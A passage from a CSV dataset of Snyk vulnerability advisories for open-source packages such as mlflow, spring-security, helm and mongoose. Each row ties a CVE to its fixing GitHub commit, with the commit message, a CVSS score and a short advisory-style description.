CVE-2019-19013,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PAGEKITPAGEKIT-5781380,19/07/2023,24/05/2022,https://github.com/pagekit/pagekit/commit/cd827f35f7f502bac2857afa2503697d029abf9b,Cross-site Request Forgery (CSRF),https://api.github.com/repos/pagekit/pagekit/commits/cd827f35f7f502bac2857afa2503697d029abf9b,Malte,malte@yootheme.com,pagekit,cd827f35f7f502bac2857afa2503697d029abf9b,finder - add csrf protection,Markdown,4.3,medium,"pagekit/pagekit is a modular and lightweight CMS built with Symfony components and Vue.js.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) via FinderController.php which allows an attacker to upload an arbitrary file by removing the CSRF token from a request.",2023
CVE-2019-14881,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5781379,19/07/2023,24/05/2022,https://github.com/moodle/moodle/commit/4676d5ad35abd080da29475df946461da6da0bf9,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/4676d5ad35abd080da29475df946461da6da0bf9,Mihail Geshoski,mihail@moodle.com,moodle,4676d5ad35abd080da29475df946461da6da0bf9,MDL-66762 tool_dataprivacy: Sanitize the extra fields in the webservice,PHP,6.1,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization in some locations where user email is displayed.",2023
CVE-2019-11255,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKUBERNETESCSIEXTERNALSNAPSHOTTERPKGCONTROLLER-5781355,19/07/2023,24/05/2022,https://github.com/kubernetes-csi/external-provisioner/commit/a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,Access Restriction Bypass,https://api.github.com/repos/kubernetes-csi/external-provisioner/commits/a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,Jan Safranek,jsafrane@redhat.com,external-provisioner,a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,"Sanitize error messages

So they do not leak SnapshotContent / PV existence",Go,6.5,medium,"Affected versions of this package are vulnerable to Access Restriction Bypass due to improper input validation which could result in unauthorized PersistentVolume data access or volume mutation during snapshot, restore from snapshot, cloning and resizing operations.",2023
CVE-2019-11255,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKUBERNETESCSIEXTERNALPROVISIONERPKGCONTROLLER-5781354,19/07/2023,24/05/2022,https://github.com/kubernetes-csi/external-provisioner/commit/a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,Access Restriction Bypass,https://api.github.com/repos/kubernetes-csi/external-provisioner/commits/a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,Jan Safranek,jsafrane@redhat.com,external-provisioner,a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,"Sanitize error messages

So they do not leak SnapshotContent / PV existence",Go,6.5,medium,"Affected versions of this package are vulnerable to Access Restriction Bypass due to improper input validation which could result in unauthorized PersistentVolume data access or volume mutation during snapshot, restore from snapshot, cloning and resizing operations.",2023
CVE-2023-33265,CWE-732,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMHAZELCAST-5781353,19/07/2023,19/07/2023,https://github.com/hazelcast/hazelcast/commit/407f10bec603a1b1cb1b042b2732c656c533fe2c,Incorrect Permission Assignment for Critical Resource,https://api.github.com/repos/hazelcast/hazelcast/commits/407f10bec603a1b1cb1b042b2732c656c533fe2c,Metin Dumandag,29387993+mdumandag@users.noreply.github.com,hazelcast,407f10bec603a1b1cb1b042b2732c656c533fe2c,"Improve permission control of executor service proxies [API-2008] [5.1.z] (#24452)

We had a feature to perform permission control for invocations sent over
the client.

These permissions were missing from the message tasks of ExecutorService
and DurableExecutor service.

In this PR, similar to the permissions used in the
ScheduledExecutorService, I have introduced two new permissions for
`READ` and `MODIFY` operations and updated the message tasks with those.

Also, I saw that we were not enforcing permissions for the invocations
sent over the client-side ScheduledExecutorService proxy. I have fixed
that and added tests for it.

backport of https://github.com/hazelcast/hazelcast/pull/24271",Java,7.6,high,"com.hazelcast:hazelcast is a clustering and highly scalable data distribution platform.
Affected versions of this package are vulnerable to Incorrect Permission Assignment for Critical Resource in executor services, which don't check client permissions properly, allowing authenticated users to execute tasks on members without the required permissions. 
NOTE: Only users using executor services for distributed data structures are affected.",2023
CVE-2023-3765,CWE-36,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-5781352,19/07/2023,19/07/2023,https://github.com/mlflow/mlflow/commit/0f2ad0236e355b0816a06670eccf69f57551fa2d,Directory Traversal,https://api.github.com/repos/mlflow/mlflow/commits/0f2ad0236e355b0816a06670eccf69f57551fa2d,Serena Ruan,82044803+serena-ruan@users.noreply.github.com,mlflow,0f2ad0236e355b0816a06670eccf69f57551fa2d,"fix validate_path_is_safe function on windows (#8999)

Signed-off-by: Serena Ruan <serena.rxy@gmail.com>",Python,10.0,critical,"mlflow is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.
Affected versions of this package are vulnerable to Directory Traversal via the validate_path_is_safe() function in file /mlflow/server/handlers.py, due to improper sanitization of absolute Windows path with forward slash (/) separators.
Exploiting this vulnerability allows to list, download, write, and delete files on the system.
Note:
Exploiting this vulnerability is possible only on hosts running Windows operating system.",2023
CVE-2019-11255,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMKUBERNETESCSIEXTERNALRESIZERPKGCONTROLLER-5781356,19/07/2023,24/05/2022,https://github.com/kubernetes-csi/external-provisioner/commit/a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,Access Restriction Bypass,https://api.github.com/repos/kubernetes-csi/external-provisioner/commits/a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,Jan Safranek,jsafrane@redhat.com,external-provisioner,a1abad28c1d4dfb3e3aee595e0b2d18b8d3f5625,"Sanitize error messages

So they do not leak SnapshotContent / PV existence",Go,6.5,medium,"Affected versions of this package are vulnerable to Access Restriction Bypass due to improper input validation which could result in unauthorized PersistentVolume data access or volume mutation during snapshot, restore from snapshot, cloning and resizing operations.",2023
CVE-2021-34121,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-MICHAELRSWEETHTMLDOC-5781235,18/07/2023,18/07/2023,https://github.com/michaelrsweet/htmldoc/commit/c67bbd8756f015e33e4ba639a40c7f9d8bd9e8ab,Out-of-bounds Read,https://api.github.com/repos/michaelrsweet/htmldoc/commits/c67bbd8756f015e33e4ba639a40c7f9d8bd9e8ab,Michael R Sweet,michael.r.sweet@gmail.com,htmldoc,c67bbd8756f015e33e4ba639a40c7f9d8bd9e8ab,Fix array overflow for headings using roman numerals (Issue #433),Markdown,8.2,high,"Affected versions of this package are vulnerable to Out-of-bounds Read via the function parse_tree() in toc.cxx, possibly leading to memory layout information leaking in the data. This might be used in a chain of vulnerabilities to reach code execution.",2023
CVE-2019-14939,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5777895,18/07/2023,24/05/2022,https://github.com/mysqljs/mysql/commit/337e87ae5fcea3667864197c65dc758517fcde06,Information Exposure,https://api.github.com/repos/mysqljs/mysql/commits/337e87ae5fcea3667864197c65dc758517fcde06,Douglas Christopher Wilson,doug@somethingdoug.com,mysql,337e87ae5fcea3667864197c65dc758517fcde06,"Add localInfile option to control LOAD DATA LOCAL INFILE

closes #2185",Markdown,5.5,medium,"Affected versions of this package are vulnerable to Information Exposure via the LOAD DATA LOCAL INFILE option, which is open by default.",2023
CVE-2023-37479,CWE-665,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENENCLAVEOPENENCLAVE-5780999,18/07/2023,18/07/2023,https://github.com/openenclave/openenclave/commit/ca54623333875b9beaad92c999a92b015c44b079,Improper Initialization,https://api.github.com/repos/openenclave/openenclave/commits/ca54623333875b9beaad92c999a92b015c44b079,Ming-Wei Shih,mishih@microsoft.com,openenclave,ca54623333875b9beaad92c999a92b015c44b079,"Security fix for AC flag poisoning and MCDT

This PR does the following
- Ensuring the AC flag along with other system/control flags are always cleared upon enclave enter
- Update the inital MXCSR value to 0x1FBF and put lfence after MXCSR load (via LDMXCSR, XRSTOR, or FXRSTOR)
  for the MCDT mitigation

Signed-off-by: Ming-Wei Shih <mishih@microsoft.com>",PHP,5.9,medium,"Affected versions of this package are vulnerable to Improper Initialization by not sufficiently sanitizing the MXCSR register on enclave entry. This makes applications vulnerable to MXCSR Configuration Dependent Timing (MCDT) attacks, where incorrect MXCSR values can impact instruction retirement by at most one cycle, depending on the (secret) data operand value. Also, the SDK does not sanitize x86's alignment check flag RFLAGS.AC on enclave entry. This allows a side-channel attacker to be notified for every unaligned memory access performed by the enclave.",2023
CVE-2019-16146,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOPHISHGOPHISH-5777898,18/07/2023,24/05/2022,https://github.com/gophish/gophish/commit/24fe998a3aa04e205900476a9601d481e94d8eea,Cross-site Scripting (XSS),https://api.github.com/repos/gophish/gophish/commits/24fe998a3aa04e205900476a9601d481e94d8eea,David Maciejak,david.maciejak@gmail.com,gophish,24fe998a3aa04e205900476a9601d481e94d8eea,"Fix multiple XSS issues in User Management Page (#1547)

If the user name is embedding some JS code, it will be executed on the client side. Note: gophish/static/js/dist/app/users.min.js will need to be regenerated too.",JavaScript,4.8,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via a username, due to improper sanitization in static/js/src/app/users.js",2023
CVE-2023-37265,CWE-306,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMICEWHALETECHCASAOSGATEWAYROUTE-5777899,18/07/2023,18/07/2023,https://github.com/IceWhaleTech/CasaOS-Gateway/commit/391dd7f0f239020c46bf057cfa25f82031fc15f7,Missing Authentication for Critical Function,https://api.github.com/repos/IceWhaleTech/CasaOS-Gateway/commits/391dd7f0f239020c46bf057cfa25f82031fc15f7,CorrectRoadH,a778917369@gmail.com,CasaOS-Gateway,391dd7f0f239020c46bf057cfa25f82031fc15f7,"Merge pull request from GHSA-vjh7-5r6x-xh6g

* fix:Incorrect identification of source IP addresses

* feat: support reverse proxy

* stash

* stash

* fix: the bug

* fix: the bug

* fix: the bug

* fix: the bug

* delete unused comment

* refacotr the proccess

* add comment to notice user to config correct proxy setting

* fix:some problems

* refactor the ip

* Update gateway_route.go",Go,8.1,high,"Affected versions of this package are vulnerable to Missing Authentication for Critical Function due to a lack of IP address verification, an unauthenticated attacker can execute arbitrary commands as root on CasaOS instances.",2023
CVE-2023-34034,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKSECURITY-5777893,18/07/2023,18/07/2023,https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780,Access Control Bypass,https://api.github.com/repos/spring-projects/spring-security/commits/7813a9ba26e53fe54e4d2ec6eb076126e8550780,Marcus Da Coregio,marcusdacoregio@gmail.com,spring-security,7813a9ba26e53fe54e4d2ec6eb076126e8550780,Use default PathPatternParser instance,Java,9.1,critical,"org.springframework.security:spring-security-config is a security configuration package for Spring Framework.
Affected versions of this package are vulnerable to Access Control Bypass. When using ** as a pattern in Spring Security configuration for WebFlux a mismatch in pattern matching is created between Spring Security and Spring WebFlux, resulting in a security bypass.
Note:
The fixed versions require Spring Framework versions:

6.0.11+

5.3.29+

5.2.25+


Note:
The Spring security team have published information about an existing PoC, but have not shared the PoC itself publicly, therefore we don't currently have the ability to verify it.",2023
CVE-2019-14939,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-MYSQL-5777894,18/07/2023,24/05/2022,https://github.com/mysqljs/mysql/commit/337e87ae5fcea3667864197c65dc758517fcde06,Information Exposure,https://api.github.com/repos/mysqljs/mysql/commits/337e87ae5fcea3667864197c65dc758517fcde06,Douglas Christopher Wilson,doug@somethingdoug.com,mysql,337e87ae5fcea3667864197c65dc758517fcde06,"Add localInfile option to control LOAD DATA LOCAL INFILE

closes #2185",Markdown,5.5,medium,"mysql is a node.js driver for mysql. It is written in JavaScript, does not require compiling, and is 100% MIT licensed.
Affected versions of this package are vulnerable to Information Exposure via the LOAD DATA LOCAL INFILE option, which is open by default.",2023
CVE-2019-18658,CWE-59,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-HELMSHHELMV3PKGCHARTUTIL-5777897,18/07/2023,25/05/2022,https://github.com/helm/helm/commit/8dce272473e5f2a7bf58ce79bb5c3691db54c96b,Symlink Attack,https://api.github.com/repos/helm/helm/commits/8dce272473e5f2a7bf58ce79bb5c3691db54c96b,Matt Farina,matt@mattfarina.com,helm,8dce272473e5f2a7bf58ce79bb5c3691db54c96b,"Fix error when loading irregular files

Signed-off-by: Matt Farina <matt@mattfarina.com>",Go,9.8,critical,"helm.sh/helm/v3/pkg/chartutil is a package manager for kubernetes.
Affected versions of this package are vulnerable to Symlink Attack by using a maliciously designed chart to include sensitive content, such as /etc/passwd, or to execute a denial of service (DoS) by a special file, such as /dev/urandom, via symlinks.
Note:
This is a client-only issue.",2023
CVE-2019-18658,CWE-59,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHELMHELMPKGCHARTUTIL-5777896,18/07/2023,25/05/2022,https://github.com/helm/helm/commit/8dce272473e5f2a7bf58ce79bb5c3691db54c96b,Symlink Attack,https://api.github.com/repos/helm/helm/commits/8dce272473e5f2a7bf58ce79bb5c3691db54c96b,Matt Farina,matt@mattfarina.com,helm,8dce272473e5f2a7bf58ce79bb5c3691db54c96b,"Fix error when loading irregular files

Signed-off-by: Matt Farina <matt@mattfarina.com>",Go,9.8,critical,"github.com/helm/helm/pkg/chartutil is a package manager for kubernetes.
Affected versions of this package are vulnerable to Symlink Attack by using a maliciously designed chart to include sensitive content, such as /etc/passwd, or to execute a denial of service (DoS) by a special file, such as /dev/urandom, via symlinks.
Note:
This is a client-only issue.",2023
CVE-2023-34035,CWE-285,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKSECURITY-5777882,18/07/2023,18/07/2023,https://github.com/spring-projects/spring-security/commit/bb46a5427005e33e637b15948de8adae244ce547,Improper Authorization,https://api.github.com/repos/spring-projects/spring-security/commits/bb46a5427005e33e637b15948de8adae244ce547,Josh Cummings,josh.cummings@gmail.com,spring-security,bb46a5427005e33e637b15948de8adae244ce547,"Add DispatcherServlet to Tests

Issue gh-13551",Java,7.5,high,"org.springframework.security:spring-security-config is a security configuration package for Spring Framework.
Affected versions of this package are vulnerable to Improper Authorization due to improper validation in the requestMatchers, leading to authorization rule misconfiguration when the application uses requestMatchers(String) and multiple servlets, one of them being Spring MVC’s DispatcherServlet.
Notes:
An application is only vulnerable when all of the following are true:

Spring MVC is on the classpath.

Spring Security is securing more than one servlet in a single application (one of them being Spring MVC’s DispatcherServlet).

The application uses requestMatchers(String) to refer to endpoints that are not Spring MVC endpoints.",2023
CVE-2023-37475,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHAMBAAVRO-5777730,17/07/2023,17/07/2023,https://github.com/hamba/avro/commit/b4a402f41cf44b6094b5131286830ba9bb1eb290,Denial of Service (DoS),https://api.github.com/repos/hamba/avro/commits/b4a402f41cf44b6094b5131286830ba9bb1eb290,Nicholas Wiersma,nick@wiersma.co.za,avro,b4a402f41cf44b6094b5131286830ba9bb1eb290,feat: add max byte slice size config (#273),Markdown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). A well-crafted string passed to avro's github.com/hamba/avro/v2.Unmarshal() can throw a fatal error: runtime: out of memory which is unrecoverable and can cause denial of service of the consumer of avro.
Note:
The root cause of the issue is that avro uses part of the input to Unmarshal() to determine the size when creating a new slice.",2023
CVE-2023-37475,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHAMBAAVROV2-5777731,17/07/2023,17/07/2023,https://github.com/hamba/avro/commit/b4a402f41cf44b6094b5131286830ba9bb1eb290,Denial of Service (DoS),https://api.github.com/repos/hamba/avro/commits/b4a402f41cf44b6094b5131286830ba9bb1eb290,Nicholas Wiersma,nick@wiersma.co.za,avro,b4a402f41cf44b6094b5131286830ba9bb1eb290,feat: add max byte slice size config (#273),Markdown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). A well-crafted string passed to avro's github.com/hamba/avro/v2.Unmarshal() can throw a fatal error: runtime: out of memory which is unrecoverable and can cause denial of service of the consumer of avro.
Note:
The root cause of the issue is that avro uses part of the input to Unmarshal() to determine the size when creating a new slice.",2023
CVE-2023-3700,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ALEXTSELEGIDISEASYAPPOINTMENTS-5777727,17/07/2023,17/07/2023,https://github.com/alextselegidis/easyappointments/commit/b37b46019553089db4f22eb2fe998bca84b2cb64,Access Control Bypass,https://api.github.com/repos/alextselegidis/easyappointments/commits/b37b46019553089db4f22eb2fe998bca84b2cb64,Alex Tselegidis,alextselegidis@gmail.com,easyappointments,b37b46019553089db4f22eb2fe998bca84b2cb64,Only allow authorized users to manage appointments from the calendar page (#1387),PHP,6.3,medium,"alextselegidis/easyappointments is a powerful Open Source Appointment Scheduler that can be installed on your server.
Affected versions of this package are vulnerable to Access Control Bypass due to Insecure Direct Object Reference, which can allow an attack to perform actions on another user's behalf.",2023
,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-5777726,17/07/2023,16/06/2023,https://github.com/NaturalIntelligence/fast-xml-parser/commit/9a880b887916855c3a510869fd1ee268d7fe58b1,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/NaturalIntelligence/fast-xml-parser/commits/9a880b887916855c3a510869fd1ee268d7fe58b1,Julian Gilbey,julian-git@d-and-j.net,fast-xml-parser,9a880b887916855c3a510869fd1ee268d7fe58b1,"Merge pull request from GHSA-gpv5-7x3g-ghjv

Co-authored-by: Julian Gilbey <jdg@debian.org>",JavaScript,3.7,low,"fast-xml-parser is a Validate XML, Parse XML, Build XML without C/C++ based libraries
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper validation of the entity names against the XML specification.",2023
,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5803128,17/07/2023,16/06/2023,https://github.com/NaturalIntelligence/fast-xml-parser/commit/9a880b887916855c3a510869fd1ee268d7fe58b1,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/NaturalIntelligence/fast-xml-parser/commits/9a880b887916855c3a510869fd1ee268d7fe58b1,Julian Gilbey,julian-git@d-and-j.net,fast-xml-parser,9a880b887916855c3a510869fd1ee268d7fe58b1,"Merge pull request from GHSA-gpv5-7x3g-ghjv

Co-authored-by: Julian Gilbey <jdg@debian.org>",JavaScript,3.7,low,"org.webjars.npm:fast-xml-parser is a Validate XML, Parse XML, Build XML without C/C++ based libraries
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper validation of the entity names against the XML specification.",2023
CVE-2023-3434,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAVOIRFAIRELINUXJAMICLIENTQT-5777725,17/07/2023,17/07/2023,https://github.com/savoirfairelinux/jami-client-qt/commit/a05632e3f447e8819457eff83aead42a10a51f8b,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/savoirfairelinux/jami-client-qt/commits/a05632e3f447e8819457eff83aead42a10a51f8b,Sébastien Blin,sebastien.blin@savoirfairelinux.com,jami-client-qt,a05632e3f447e8819457eff83aead42a10a51f8b,"misc: avoid dirty qrc urls

e.g. <a href=""test"" id=""fuzzelement1"">test</a> is invalid
and should not open qrc://components/test

Also fix editId on message edition and format in the reply row.

Change-Id: I570ddf18f6ba716e448e9fbadd558a4d04cdef1c",Unknown,4.3,medium,"Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') in the form of spoofed messages, by passing custom HTML anchor tags in message text, which are used to build QRC URL strings that are presented to the user.
NOTE: This vulnerability is only exploitable on Windows.",2023
CVE-2023-3696,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5777722,17/07/2023,17/07/2023,https://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d,Prototype Pollution,https://api.github.com/repos/automattic/mongoose/commits/305ce4ff789261df7e3f6e72363d0703e025f80d,Valeri Karpov,val@karpov.io,mongoose,305ce4ff789261df7e3f6e72363d0703e025f80d,fix: avoid prototype pollution on init,JavaScript,8.1,high,"org.webjars.npm:mongoose is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.
Affected versions of this package are vulnerable to Prototype Pollution in document.js, via update functions such as findByIdAndUpdate(). If the affected application is using Express and EJS, this can allow remote code execution.",2023
CVE-2023-3696,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MONGOOSE-5777721,17/07/2023,17/07/2023,https://github.com/automattic/mongoose/commit/305ce4ff789261df7e3f6e72363d0703e025f80d,Prototype Pollution,https://api.github.com/repos/automattic/mongoose/commits/305ce4ff789261df7e3f6e72363d0703e025f80d,Valeri Karpov,val@karpov.io,mongoose,305ce4ff789261df7e3f6e72363d0703e025f80d,fix: avoid prototype pollution on init,JavaScript,8.1,high,"mongoose is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.
Affected versions of this package are vulnerable to Prototype Pollution in document.js, via update functions such as findByIdAndUpdate(). If the affected application is using Express and EJS, this can allow remote code execution.",2023
CVE-2023-3433,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SAVOIRFAIRELINUXJAMIDAEMON-5777724,17/07/2023,17/07/2023,https://github.com/savoirfairelinux/jami-daemon/commit/33e6ac43487a69c6b772208f1d622cfdf932fe28,Denial of Service (DoS),https://api.github.com/repos/savoirfairelinux/jami-daemon/commits/33e6ac43487a69c6b772208f1d622cfdf932fe28,Sébastien Blin,sebastien.blin@savoirfairelinux.com,jami-daemon,33e6ac43487a69c6b772208f1d622cfdf932fe28,"conversationrepository remove ""<>"" from display name

This should not appears in user.name as it will fail during
the signature creation.

Change-Id: I8bc04b9fdd60cb6c80fc267d064433ab331f6338",C/C++,5.5,medium,"Affected versions of this package are vulnerable to Denial of Service (DoS) via the ""nickname""/""display name"" parameter in conversationrepository.cpp. An attacker can pass in < and > characters to cause a deadlock.
NOTE: This vulnerability is only exploitable on Windows.",2023
CVE-2023-37474,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-COPYPARTY-5777718,16/07/2023,16/07/2023,https://github.com/9001/copyparty/commit/043e3c7dd683113e2b1c15cacb9c8e68f76513ff,Directory Traversal,https://api.github.com/repos/9001/copyparty/commits/043e3c7dd683113e2b1c15cacb9c8e68f76513ff,ed,s@ocv.me,copyparty,043e3c7dd683113e2b1c15cacb9c8e68f76513ff,"fix traversal vulnerability GHSA-pxfv-7rr3-2qjg:
the /.cpr endpoint allowed full access to server filesystem,
unless mitigated by prisonparty",Python,7.5,high,"Affected versions of this package are vulnerable to Directory Traversal in the handle_get() function under httpcli.py. The .cpr subfolder exposes files, directories, and commands outside the web document root directory.",2023
CVE-2019-14243,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMASTERCACTAPUSPROXYPROTOCOL-5777709,16/07/2023,24/05/2022,https://github.com/mastercactapus/proxyprotocol/commit/5c4a101121fc3e868026189c7a73f7f19eef90ac,Denial of Service (DoS),https://api.github.com/repos/mastercactapus/proxyprotocol/commits/5c4a101121fc3e868026189c7a73f7f19eef90ac,Nathaniel Caza,mastercactapus@gmail.com,proxyprotocol,5c4a101121fc3e868026189c7a73f7f19eef90ac,Add test and fix for malformed/truncated header,Go,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) via a crafted HAProxy PROXY v2 request with truncated source/destination address data.,2023
CVE-2018-18942,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-PHP-BASERPROJECTBASERCMS-5777708,16/07/2023,13/05/2022,https://github.com/baserproject/basercms/commit/5f29513bfb02a8c08f1e20a1d1431b6631e96087,Arbitrary File Upload,https://api.github.com/repos/baserproject/basercms/commits/5f29513bfb02a8c08f1e20a1d1431b6631e96087,ryuring,ryuring55@gmail.com,basercms,5f29513bfb02a8c08f1e20a1d1431b6631e96087,エディタテンプレートででアイコン画像をアップロード時に画像以外のファイルをアップロードするとエラーメッセージを表示するようにした,PHP,7.2,high,"baserproject/basercms is a Content management system based on CakePHP.
Affected versions of this package are vulnerable to Arbitrary File Upload via the admin/theme_configs/form data[ThemeConfig][logo] parameter.",2023
CVE-2021-31294,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-REDISREDIS-5777707,16/07/2023,16/07/2023,https://github.com/redis/redis/commit/46f4ebbe842620f0976a36741a72482620aa4b48,Denial of Service (DoS),https://api.github.com/repos/redis/redis/commits/46f4ebbe842620f0976a36741a72482620aa4b48,Oran Agra,oran@redislabs.com,redis,46f4ebbe842620f0976a36741a72482620aa4b48,"Prevent replicas from sending commands that interact with keyspace (#8868)

This solves an issue reported in #8712 in which a replica would bypass
the client write pause check and cause an assertion due to executing a
write command during failover.

The fact is that we don't expect replicas to execute any command other
than maybe REPLCONF and PING, etc. but matching against the ADMIN
command flag is insufficient, so instead i just block keyspace access
for now.",C/C++,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) when a replica can cause an assertion failure in a primary server by sending a non-administrative command (specifically, a SET command).",2023
CVE-2023-3674,CWE-1283,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-KEYLIME-5777706,16/07/2023,12/07/2023,https://github.com/keylime/keylime/commit/95ce3d86bd2c53009108ffda2dcf553312d733db,Mutable Attestation or Measurement Reporting Data,https://api.github.com/repos/keylime/keylime/commits/95ce3d86bd2c53009108ffda2dcf553312d733db,Stefan Berger,stefanb@linux.ibm.com,keylime,95ce3d86bd2c53009108ffda2dcf553312d733db,"tpm_util: Replace a logger.error with an Exception in case of invalid signature

This fixes a possibly severe issue in 7.2.5 & 7.3.0.

Signed-off-by: Stefan Berger <stefanb@linux.ibm.com>",Python,1.9,low,"keylime is a TPM-based key bootstrapping and system integrity measurement system for cloud
Affected versions of this package are vulnerable to Mutable Attestation or Measurement Reporting Data due to attestation failure when the quote's signature does not validate.
To exploit this vulnerability a non-privileged user would have to modify the keylime agent to create invalid quotes a could then use invalid measurement lists to hide the trust state of a system. The attacker would then have to trick the administrator into using the user's modified keylime agent.",2023
CVE-2023-34458,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMULTIVERSXMXCHAINGOCOMMON-5776169,14/07/2023,13/07/2023,https://github.com/multiversx/mx-chain-go/commit/babdb144f1316ab6176bf3dbd7d4621120414d43,Denial of Service (DoS),https://api.github.com/repos/multiversx/mx-chain-go/commits/babdb144f1316ab6176bf3dbd7d4621120414d43,Iulian Pascalau,36724586+iulianpascalau@users.noreply.github.com,mx-chain-go,babdb144f1316ab6176bf3dbd7d4621120414d43,"Merge pull request from GHSA-j494-7x2v-vvvp

Fix wrong nonce in relayed failed transaction",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). When executing a relayed transaction, if the inner transaction fails, it would increase the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account.",2023
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PHP-POCKETMINEPOCKETMINEMP-5777703,16/07/2023,15/07/2023,https://github.com/pmmp/PocketMine-MP/commit/0c250a2ef09627b48aa52302f6cc7e1f2afb70ea,Denial of Service (DoS),https://api.github.com/repos/pmmp/PocketMine-MP/commits/0c250a2ef09627b48aa52302f6cc7e1f2afb70ea,Dylan K. Taylor,dktapps@pmmp.io,PocketMine-MP,0c250a2ef09627b48aa52302f6cc7e1f2afb70ea,InGamePacketHandler: fixed inconsistent handling of invalid data in BlockActorDataPacket,PHP,7.5,high,"pocketmine/pocketmine-mp is a highly customisable, open source server software for Minecraft: Bedrock Edition written in PHP
Affected versions of this package are vulnerable to Denial of Service (DoS) in the handleBlockActorData() function in InGamePacketHandler.php, when processing incorrect NBT sign data, which causes a crash.",2023
CVE-2023-34458,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMULTIVERSXMXCHAINGOCMD-5776168,14/07/2023,13/07/2023,https://github.com/multiversx/mx-chain-go/commit/babdb144f1316ab6176bf3dbd7d4621120414d43,Denial of Service (DoS),https://api.github.com/repos/multiversx/mx-chain-go/commits/babdb144f1316ab6176bf3dbd7d4621120414d43,Iulian Pascalau,36724586+iulianpascalau@users.noreply.github.com,mx-chain-go,babdb144f1316ab6176bf3dbd7d4621120414d43,"Merge pull request from GHSA-j494-7x2v-vvvp

Fix wrong nonce in relayed failed transaction",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). When executing a relayed transaction, if the inner transaction fails, it would increase the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account.",2023
CVE-2023-34458,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMULTIVERSXMXCHAINGOCONFIG-5776170,14/07/2023,13/07/2023,https://github.com/multiversx/mx-chain-go/commit/babdb144f1316ab6176bf3dbd7d4621120414d43,Denial of Service (DoS),https://api.github.com/repos/multiversx/mx-chain-go/commits/babdb144f1316ab6176bf3dbd7d4621120414d43,Iulian Pascalau,36724586+iulianpascalau@users.noreply.github.com,mx-chain-go,babdb144f1316ab6176bf3dbd7d4621120414d43,"Merge pull request from GHSA-j494-7x2v-vvvp

